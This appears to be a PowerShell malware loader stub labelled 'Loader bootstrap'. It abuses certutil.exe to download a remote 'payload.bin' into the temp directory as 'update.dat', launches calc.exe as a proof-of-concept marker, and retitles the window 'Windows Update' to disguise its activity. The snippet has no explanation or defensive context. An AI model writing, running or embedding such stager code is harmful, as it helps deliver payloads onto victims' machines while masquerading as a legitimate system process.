
<# Loader bootstrap #> try { certutil.exe -urlcache -split -f "https://internal.corp/payload.bin" "$env:TEMP\update.dat"; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Stage transfer failed" }
